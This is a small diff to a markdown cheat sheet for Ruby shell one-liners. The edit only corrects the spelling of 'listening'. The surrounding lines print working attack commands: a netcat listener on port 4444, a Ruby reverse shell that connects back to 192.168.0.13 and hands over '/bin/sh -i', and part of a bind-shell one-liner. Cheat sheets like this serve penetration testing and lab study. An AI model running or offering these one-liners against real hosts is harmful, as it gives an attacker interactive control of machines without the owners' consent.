@@ -10,7 +10,7 @@ ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts 
 since `192.168.0.15` is the victim IP
 
 ## Reverse shell
-Attacker is listining on port 4444 `nc -lvp 4444`. Now on victim machine run
+Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run
 ```ruby
 ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
 ```
